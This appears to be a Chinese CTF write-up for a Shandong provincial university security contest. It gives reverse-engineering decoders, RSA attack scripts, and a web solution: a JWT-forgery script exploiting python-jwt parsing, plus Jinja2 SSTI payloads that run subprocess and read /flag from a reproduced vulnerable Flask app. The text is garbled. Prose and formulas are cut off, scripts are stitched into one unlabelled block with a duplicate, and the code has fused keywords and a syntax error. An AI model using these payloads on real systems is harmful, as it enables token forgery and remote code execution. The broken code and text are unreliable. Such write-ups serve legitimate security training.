# "鹏云杯"第十二届山东省大学生网络安全技能大赛线上选拔赛WriteUp

> 原文: https://www.ctfiot.com/271997.html
> ID: 271997

前言

简介

“鹏云杯”第十二届山东省大学生网络安全技能大赛-网络安全技术爱好者-线上选拔赛-题解。

欢迎关注公众号【Real返璞归真】回复【山东省赛】获取完整题目附件下载地址。

解题情况
image-20250927135550401
image-20250927135607485
image-20250927135628260
image-20250927135729002
image-20250927135722065

Reverse

game

拖入IDA分析，发现是一个迷宫游戏：
image-20250927120413325

输入wasd后会进行检查，如果走迷宫途中遇到Boss会进入另一个游戏game()函数。

分析game()函数：
image-20250927121936176

发现一共有4个Boss在迷宫中，击败不同boss会对enc造成不同的影响。

到达终点会调用print_flag()函数打印flag：
image-20250927120648442

进入print_flag()函数继续分析：
image-20250927120728670

发现两段数据，用到的key是固定的，但enc与game()有关。

编写脚本：

byte_4020 = [0x22, 0xc6, 0x39, 0x8e, 0xdc, 0x0b, 0x59, 0x4c, 0xfa, 0xa3,
                 0x05, 0x86, 0xcf, 0x3d, 0xb7, 0x1d, 0x63, 0xac, 0x2e, 0xef,
                 0x44, 0x97, 0x5c, 0x7b, 0xd2, 0x08, 0x89, 0xb9, 0x36, 0xc9,
                 0x4a, 0x13, 0x9c, 0xde, 0x29, 0x6c, 0xf7, 0x53, 0x82]

byte_4060 = [0x40, 0xa6, 0x5c, 0xf5, 0x9b, 0x4b, 0x38, 0x36, 0x9b, 0xc6,
             0x7d, 0xef, 0xb7, 0x1e, 0xd9, 0x11, 0x14, 0xc3, 0x6d, 0x92,
             0x26, 0xff, 0x3f, 0x08, 0xb7, 0x60, 0xe6, 0xd8, 0x5e, 0x92,
             0x01, 0x62, 0xd4, 0xbd, 0x60, 0x11, 0x81, 0x32, 0xfb]

for i in range(len(byte_4020)):
    byte_4020[i] += 4

flag = ''
for i in range(39):
    c = byte_4060[i] ^ byte_4020[i]
    flag += chr(c) if0x20 <= c <= 0x7Eelse'.'
print(flag)

error

题目好像出错了，按照没正常执行的分支解密能得到：flag{Th1s_1s_My_S1mpl3_Fl4g_f0r_CTF}，输出到程序提示incorrect。

按照程序原本的逻辑解密得到不可见的编码，但是输入到程序中提示correct。

更离谱的是，这道题目在出错的情况下有110解。

拖入IDA分析，程序逻辑非常简单：
image-20250927123109599

将输入传入encrypt()函数进行加密，然后取hex与于程序的enc进行比较。

核心在于分析encrypt()函数：
image-20250927123348863

继续分析sub_1249()函数：
image-20250927123437072

发现该函数的逻辑是

执行三轮加密，每一轮：

逻辑左移round+1位

如果当前轮数是奇数，将数组反转。如果当前轮数是偶数，相邻元素交换。

对每个候选 S 计算

检查判别式  是否为完全平方

若是，则解出 ，进而得到  并验证 。


```
byte_4020 = [0x22, 0xc6, 0x39, 0x8e, 0xdc, 0x0b, 0x59, 0x4c, 0xfa, 0xa3,
                 0x05, 0x86, 0xcf, 0x3d, 0xb7, 0x1d, 0x63, 0xac, 0x2e, 0xef,
                 0x44, 0x97, 0x5c, 0x7b, 0xd2, 0x08, 0x89, 0xb9, 0x36, 0xc9,
                 0x4a, 0x13, 0x9c, 0xde, 0x29, 0x6c, 0xf7, 0x53, 0x82]

byte_4060 = [0x40, 0xa6, 0x5c, 0xf5, 0x9b, 0x4b, 0x38, 0x36, 0x9b, 0xc6,
             0x7d, 0xef, 0xb7, 0x1e, 0xd9, 0x11, 0x14, 0xc3, 0x6d, 0x92,
             0x26, 0xff, 0x3f, 0x08, 0xb7, 0x60, 0xe6, 0xd8, 0x5e, 0x92,
             0x01, 0x62, 0xd4, 0xbd, 0x60, 0x11, 0x81, 0x32, 0xfb]

for i in range(len(byte_4020)):
    byte_4020[i] += 4

flag = ''
for i in range(39):
    c = byte_4060[i] ^ byte_4020[i]
    flag += chr(c) if0x20 <= c <= 0x7Eelse'.'
print(flag)
def ror(b, s):
    s %= 8
    return ((b >> s) | (b << (8 - s))) & 0xFF

enc = list(bytes.fromhex('d2e7f6d2f17123532dd8996ec04d94a6912dafd6f1b37c1d264d43a91d804d63542ef89b'))

for round in range(2, -1, -1):
    if round % 2:
        enc = enc[::-1]
    else:
        for j in range(0, len(enc) - 1, 2):
            enc[j], enc[j+1] = enc[j+1], enc[j]

    for i in range(len(enc)):
        enc[i] = ror(enc[i], round + 1)

print(''.join(chr(x) for x in enc))
./challenge < flag.bin
def ror(b, s):
    s %= 8
    return ((b >> s) | (b << (8 - s))) & 0xFF

enc = list(bytes.fromhex('d2e7f6d2f17123532dd8996ec04d94a6912dafd6f1b37c1d264d43a91d804d63542ef89b'))
key = [0x1a,0x2b,0x3c,0x4d,0x5e,0x6f,0x70,0x81,0x92,0xa3,0xb4,0xc5,0xd6,0xe7,0xf8,0x09]

for round in range(2, -1, -1):
    if round % 2:
        enc = enc[::-1]
    else:
        for j in range(0, len(enc) - 1, 2):
            enc[j], enc[j+1] = enc[j+1], enc[j]

    for i in range(len(enc)):
        enc[i] = ror(enc[i], round + 1) ^ key[i % len(key)]

print(''.join(chr(x) for x in enc))

# flag{Th1s_1s_My_S1mpl3_Fl4g_f0r_CTF}
from Crypto.Util.number import *
from flag import flag

nbit = 256

p = getPrime(int(nbit))
q = getPrime(int(nbit))
n = p * q
t = 4
phi = (p**4-1) * (q**4-1)
d = getPrime(int(0.9*nbit))
e = inverse(d, phi)

assertb"flag{"in flag

c = pow(bytes_to_long(flag), e, n)
print("c = ", c)
print("n = ", n)
print("e = ", e)
"""
c =  4569479985227351005063785995135067032720378517762895932536659766750620715910605148533244779487921315047171013575610160508152407529266889273867903198797261
n =  4886488210976342084709096740163565218271041981736454979038282347346782586289498952728993072164156014308360739234075655553608312787941314479273226321644139
e =  69226245919249557284362852197482448692961051575353210229155811272280423133461036546714805862880491826820998627526504053578014404131806296413582035968459012627551356400980693085358304615504234701685438459878813948020276726029476169237998655600278740940333141714850818687244699016224065398835277355085190021649464175896949882797374785669601481278636634767170296279707462651980061069176263757678901169598571771064631589157944694386675873019622753613139854047148807223799604198162775252510345809461265433420840521382586775251192251617135265179686326411651203242167525116012981497530813723052998392487942518359093767791
"""
from Crypto.Util.number import long_to_bytes

c = 4569479985227351005063785995135067032720378517762895932536659766750620715910605148533244779487921315047171013575610160508152407529266889273867903198797261
n = 4886488210976342084709096740163565218271041981736454979038282347346782586289498952728993072164156014308360739234075655553608312787941314479273226321644139
e = 69226245919249557284362852197482448692961051575353210229155811272280423133461036546714805862880491826820998627526504053578014404131806296413582035968459012627551356400980693085358304615504234701685438459878813948020276726029476169237998655600278740940333141714850818687244699016224065398835277355085190021649464175896949882797374785669601481278636634767170296279707462651980061069176263757678901169598571771064631589157944694386675873019622753613139854047148807223799604198162775252510345809461265433420840521382586775251192251617135265179686326411651203242167525116012981497530813723052998392487942518359093767791

def cf(a,b):
    r=[]
    while b:
        r.append(a//b)
        a,b=b,a-b*(a//b)
    return r

def convs(cf):
    res=[]
    for i in range(len(cf)):
        num,den=1,0
        for q in cf[i::-1]:
            num,den=q*num+den,num
        res.append((num,den))
    return res

den = n**4
for k,d in convs(cf(e,den)):
    if d==0: continue
    if d.bit_length()<200or d.bit_length()>300: continue
    m = pow(c,d,n)
    pt = long_to_bytes(m)
    ifb"flag{"in pt:
        print(pt.decode())
        break

# flag{fc3f4ce8dc3eaca8807812b8c0435cd4}
from Crypto.Util.number import *
import random, gmpy2
from flag import flag
class RSAEncryptor:
    def __init__(self):
        self.g = self.a = self.b = 0
        self.e = 65537
        self.factorGen()
        self.product()

    def factorGen(self):
        whileTrue:
            self.g = getPrime(256)  

            whileTrue:
                self.a = random.randrange(1 << 273, 1 << 274)
                if gmpy2.is_prime(2*self.g*self.a + 1):
                    break

            whileTrue:
                self.b = random.randrange(1 << 273, 1 << 274)
                if gmpy2.is_prime(2*self.g*self.b + 1) and self.b != self.a:
                    break

            self.h = 2*self.g*self.a*self.b + self.a + self.b
            self.N = 2*self.g*self.h + 1
            return

    def encrypt(self, msg_int):
        return int(gmpy2.powmod(msg_int, self.e, self.N))

    def product(self):
        m = bytes_to_long(flag)
        self.enc = self.encrypt(m)
        self.show()
        print(f'enc={self.enc}')

    def show(self):
        print(f"N={self.N}")
        print(f"e={self.e}")
        print(f"g={self.g}")

RSAEncryptor()

# N=27471366612277687007582969113484500296001065780066244888800712342807125394382681326213781865815461951298727242405665286291957769318403190235219727462190547340268057407480936794909750874545280586676586199139504945994789654115224950518297646992315179314766094156202525491469674180110591820099543752380512935927805722237181
# e=65537
# g=111684314954681193048509857146926361842347687090472066568935363273885037337811
# enc=12643371534391958135236095622827564261907624974618206428861944879376238094269846145595767463703827586815298891013812360542402349502974102836324041194817837979051818191875704215738686008582339520686043633518534916826599993931844826243220488649199690449278527396151017995036899907805560418507134336681609833081538329779248
from math import isqrt, gcd
from Crypto.Util.number import long_to_bytes, inverse

N = 27471366612277687007582969113484500296001065780066244888800712342807125394382681326213781865815461951298727242405665286291957769318403190235219727462190547340268057407480936794909750874545280586676586199139504945994789654115224950518297646992315179314766094156202525491469674180110591820099543752380512935927805722237181
g = 111684314954681193048509857146926361842347687090472066568935363273885037337811
r = 2 * g
T = (N - 1) // r
S0 = T % r

for k in range(0, 400000):
    S = S0 + k * r
    if (T - S) % r != 0:
        continue
    P = (T - S) // r
    disc = S * S - 4 * P
    if disc < 0:
        continue
    s = isqrt(disc)
    if s * s != disc:
        continue
    if (S + s) % 2 != 0:
        continue
    a = (S + s) // 2
    b = (S - s) // 2
    p = 2 * g * a + 1
    q = 2 * g * b + 1
    if p * q == N:
        print(k=", k)
        break

phi = (p - 1) * (q - 1)
e = 65537
d = inverse(e, phi)

enc = 12643371534391958135236095622827564261907624974618206428861944879376238094269846145595767463703827586815298891013812360542402349502974102836324041194817837979051818191875704215738686008582339520686043633518534916826599993931844826243220488649199690449278527396151017995036899907805560418507134336681609833081538329779248

m = pow(enc, d, N)
print(long_to_bytes(m))
              
# flag{d39691fd3467e11c5c4443e65a93ab37}
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, render_template, request, jsonify, redirect, url_for, session, render_template_string
from json import loads, dumps
from python_jwt import generate_jwt, verify_jwt, process_jwt
from jwcrypto import jwk
from datetime import timedelta
import base64
import os
import subprocess
import hashlib

app = Flask(__name__)
app.config['SECRET_KEY'] = hashlib.md5(os.urandom(24)).hexdigest()

jwt_key = jwk.JWK.generate(kty='RSA', size=2048)

users={}

users['guest'] = {
    'password': 'guest',
    'role': 'guest',
    'name': 'guest',
    'department': 'guest'
}

tobacco_companies = [
    {
        'id': 1,
        'name': '测试集团1',
        'license': 'CS2025001',
        'status': '正常',
        'location': '北京市朝阳区',
        'products': ['牙膏', '牙刷', '洗发水']
    },
    {
        'id': 2, 
        'name': '测试集团2',
        'license': 'CS2025002',
        'status': '正常',
        'location': '山东省济南市',
        'products': ['把子肉', '四喜丸子']
    },
    {
        'id': 3,
        'name': '测试集团3',
        'license': 'CS2025003', 
        'status': '待审核',
        'location': '湖南省长沙市',
        'products': ['奶茶', '辣椒炒肉拌面']
    }
]

def base64url_decode(inp):
    
    padding = 4 - len(inp) % 4
    if padding:
        inp += '=' * padding
    return base64.urlsafe_b64decode(inp)

def base64url_encode(inp):
    
    return base64.urlsafe_b64encode(inp).decode('ascii').rstrip('=')

@app.route('/')
def index():
    
    return'index.html'

@app.route('/login', methods=['GET', 'POST'])
def login():
    
    if request.method == 'POST':
        data = request.get_json()
        username = data.get('username')
        password = data.get('password')
        
        
        if username in users and users[username]['password'] == password:
            user_info = users[username].copy()
            user_info['username'] = username
            
            
            payload = {
                'username': username,
                'role': user_info['role'],
                'name': user_info['name'],
                'department': user_info['department']
            }
            
            token = generate_jwt(payload, jwt_key, 'PS256', timedelta(hours=2))
            
            return jsonify({
                'success': True,
                'token': token,
                'user': user_info
            })
        else:
            return jsonify({
                'success': False,
                'message': '用户名或密码错误'
            }), 401
    
    return'login.html'

@app.route('/dashboard')
def dashboard():
    
    return'dashboard.html'

@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    
    try:
        data = request.get_json()
        token = data.get('token')
        
        ifnot token:
            return jsonify({'valid': False, 'message': '未提供token'}), 400
        
        try:
            header, payload = verify_jwt(token, jwt_key, ['PS256'])
            return jsonify({
                'valid': True,
                'payload': payload
            })
        
except Exception as e:
            return jsonify({
                'valid': False, 
                'message': f'Token验证失败: {str(e)}'
            }), 401
            
    
except Exception as e:
        return jsonify({
            'valid': False,
            'message': f'请求处理失败: {str(e)}'
        }), 500

@app.route('/api/companies')
def get_companies():
    
    try:
        auth_header = request.headers.get('Authorization')
        ifnot auth_header ornot auth_header.startswith('Bearer '):
            return jsonify({'error': '未提供认证token'}), 401
            
        token = auth_header[len('Bearer '):]
        
        
        try:
            header, payload = verify_jwt(token, jwt_key, ['PS256'])
            
            
            if payload.get('role') in ['inspector', 'manager', 'admin']:
                return jsonify({
                    'success': True,
                    'companies': tobacco_companies,
                    'user_role': payload.get('role')
                })
            else:
                return jsonify({'error': '权限不足'}), 403
                
        
except Exception as e:
            return jsonify({'error': f'Token验证失败: {str(e)}'}), 401
            
    
except Exception as e:
        return jsonify({'error': f'请求处理失败: {str(e)}'}), 500

@app.route('/api/report/generate', methods=['POST'])
def generate_report():
    try:
        auth_header = request.headers.get('Authorization')
        ifnot auth_header ornot auth_header.startswith('Bearer '):
            return jsonify({'error': '未提供认证token'}), 401
            
        token = auth_header[len('Bearer '):]
        
        
        try:
            header, payload = verify_jwt(token, jwt_key, ['PS256'])
            
            
            if payload.get('role') notin ['manager', 'admin']:
                return jsonify({
                    'error': '权限不足，只有经理和管理员可以生成报告',
                    'current_role': payload.get('role', 'unknown')
                }), 403
            
            data = request.get_json()
            company_id = data.get('company_id')
            report_template = data.get('template', '')
            custom_title = data.get('title', '企业监管报告')
            
            # 查找企业信息
            company = None
            for comp in tobacco_companies:
                if comp['id'] == company_id:
                    company = comp
                    break
            
            ifnot company:
                return jsonify({'error': '未找到指定企业'}), 404
            
            # 获取用户信息
            user_name = payload.get('name', '未知用户')
            user_dept = payload.get('department', '未知部门')

            if"{{"in report_template:
                return jsonify({'error': 'bad template'}), 400

            if report_template:
                
                template_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>{custom_title}</title>
    
</head>

    
        <h1>{custom_title}</h1>
        企业监管报告
    
    
    
        <h2>企业基本信息</h2>
        企业名称：{company['name']}
        许可证号：{company['license']}
        运营状态：{company['status']}
        所在地区：{company['location']}
        主要产品：{', '.join(company['products'])}
        
        <h2>自定义报告内容</h2>
        
            {report_template}
        
        
        
            报告生成人：{user_name}
            所属部门：{user_dept}
            生成时间：{{{{ "现在的时间" }}}}
        
    

</html>
                """
                
                
                try:
                    rendered_html = render_template_string(template_content)
                    return jsonify({
                        'success': True,
                        'report_html': rendered_html,
                        'message': '报告生成成功'
                    })
                
except Exception as e:
                    return jsonify({
                        'error': f'模板渲染失败: {str(e)}',
                        'hint': '检查模板语法是否正确'
                    }), 400
            else:
                
                default_template = f"""
                <h3>监管结论</h3>
                经过全面检查，{company['name']} 企业运营状况良好，符合国家相关规定。
                建议继续保持规范经营，定期接受监管部门检查。
                """
                
                template_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>{custom_title}</title>
    
</head>

    
        <h1>{custom_title}</h1>
        企业监管报告
    
    
    
        <h2>企业基本信息</h2>
        企业名称：{company['name']}
        许可证号：{company['license']}
        运营状态：{company['status']}
        所在地区：{company['location']}
        主要产品：{', '.join(company['products'])}
        
        {default_template}
        
        
            报告生成人：{user_name}
            所属部门：{user_dept}
        
    

</html>
                """
                
                return jsonify({
                    'success': True,
                    'report_html': template_content,
                    'message': '默认报告生成成功'
                })
                
        
except Exception as e:
            return jsonify({'error': f'Token验证失败: {str(e)}'}), 401
            
    
except Exception as e:
        return jsonify({'error': f'请求处理失败: {str(e)}'}), 500

@app.errorhandler(404)
def not_found(error):
    return render_template('404.html'), 404

@app.errorhandler(500)
def internal_error(error):
    return render_template('500.html'), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
Flask==2.3.3
python-jwt==3.3.3
jwcrypto==1.5.0
Werkzeug==2.3.7
eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9.cPXxqD1p4DfCZPkRrWIjiY_t6QkkJEu8N98c5bwnv9aF8Ynm6fwZ8eA43kw-xdjQATxrJ6MzQp60J8YnjVfQnKLDwhSrpcJubE3XkkDFoKk19x_syqKiVqB7LHBjTCteUhdXjjCt7zslEppcZdhzcznPgJewghv--6pDoP3gIXfhWmbcG48zW9o-5aeKZmt4FUdmsE6_okLfRBQNlwUXvubaHmdbRJqTwHthdtC6XokIGeqE3P3w0qgCpZkMiIT9SdeWqbKMIUyHdL_O8PbIq0-ZcOnpsdZL5pHAkX0sqFzi-Hjn2BoyDF3EzoevS6QS9CjyW0VYog8bvsrHvTvYgQ
from json import loads, dumps
from python_jwt import base64url_decode, base64url_encode

token = 'eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9.cPXxqD1p4DfCZPkRrWIjiY_t6QkkJEu8N98c5bwnv9aF8Ynm6fwZ8eA43kw-xdjQATxrJ6MzQp60J8YnjVfQnKLDwhSrpcJubE3XkkDFoKk19x_syqKiVqB7LHBjTCteUhdXjjCt7zslEppcZdhzcznPgJewghv--6pDoP3gIXfhWmbcG48zW9o-5aeKZmt4FUdmsE6_okLfRBQNlwUXvubaHmdbRJqTwHthdtC6XokIGeqE3P3w0qgCpZkMiIT9SdeWqbKMIUyHdL_O8PbIq0-ZcOnpsdZL5pHAkX0sqFzi-Hjn2BoyDF3EzoevS6QS9CjyW0VYog8bvsrHvTvYgQ'

parts = token.split('.')
header_b64, payload_b64, signature_b64 = parts

payload = loads(base64url_decode(payload_b64))
payload['role'] = 'manager'

fake_payload_b64 = base64url_encode(dumps(payload, separators=(',', ':')))
print('{"' + header_b64 + '.' + fake_payload_b64 + '.":"","protected":"' + header_b64 + '", "payload":"' + payload_b64 + '","signature":"' + signature_b64 + '"}')

# {"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Im1hbmFnZXIiLCJ1c2VybmFtZSI6Imd1ZXN0In0.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJkZXBhcnRtZW50IjoiZ3Vlc3QiLCJleHAiOjE3NTg5NTg0NzgsImlhdCI6MTc1ODk1MTI3OCwianRpIjoiMnJZZTlnOW4wWWhpSGZ3LXlabFliQSIsIm5hbWUiOiJndWVzdCIsIm5iZiI6MTc1ODk1MTI3OCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJndWVzdCJ9","signature":"cPXxqD1p4DfCZPkRrWIjiY_t6QkkJEu8N98c5bwnv9aF8Ynm6fwZ8eA43kw-xdjQATxrJ6MzQp60J8YnjVfQnKLDwhSrpcJubE3XkkDFoKk19x_syqKiVqB7LHBjTCteUhdXjjCt7zslEppcZdhzcznPgJewghv--6pDoP3gIXfhWmbcG48zW9o-5aeKZmt4FUdmsE6_okLfRBQNlwUXvubaHmdbRJqTwHthdtC6XokIGeqE3P3w0qgCpZkMiIT9SdeWqbKMIUyHdL_O8PbIq0-ZcOnpsdZL5pHAkX0sqFzi-Hjn2BoyDF3EzoevS6QS9CjyW0VYog8bvsrHvTvYgQ"}
{% set sp = config.__class__.__init__.__globals__['__builtins__']['__import__']('subprocess') %}
{% set r = sp.run(['ls','-la','/'], capture_output=True, text=True) %}
{% print(r.stdout) %}
{% set o = config.__class__.__init__.__globals__['__builtins__']['open'] %}
{% set f = o('/flag').read() %}
{% print(f) %}
{"company_id": 1, "template": "{% set open_func = config.__class__.__init__.__globals__['__builtins__']['open'] %}{% set flag_content = open_func('/flag').read() %}Flag: {% print(flag_content) %}", "title": "Flag"}
line  CODE  JT   JF      K
=================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
0008: 0x15 0x04 0x00 0x00000009  if (A == mmap) goto 0013
0009: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0013
0010: 0x15 0x02 0x00 0x0000000c  if (A == brk) goto 0013
0011: 0x15 0x01 0x00 0x0000009d  if (A == prctl) goto 0013
0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0013: 0x06 0x00 0x00 0x00000000  return KILL
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121820-wxsync-2025-09-03bb9317900d225a9cc7f13fc1229b37.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121821-wxsync-2025-09-c8bbf2ced26014a871bbd664cf7e4bcc.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121823-wxsync-2025-09-f6c73d0655dddbfa7dcdcc7114509213.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121824-wxsync-2025-09-87062ec61bccbbeb7364c7333e502662.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121826-wxsync-2025-09-2b9045582bffc161086f285cdd8af576.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121827-wxsync-2025-09-6e23012577d6b4b2afa4e5a20747dac4.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121829-wxsync-2025-09-da4393f497ebaf90570d5c3d359f5071.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121831-wxsync-2025-09-b49abe1f05d0dc76f0527eac21e6767a.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121833-wxsync-2025-09-29023c3943fc0315e9e597281f8478c3.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2025/09/1759121834-wxsync-2025-09-eedad4a19f9409692054ef7280ca2526.png)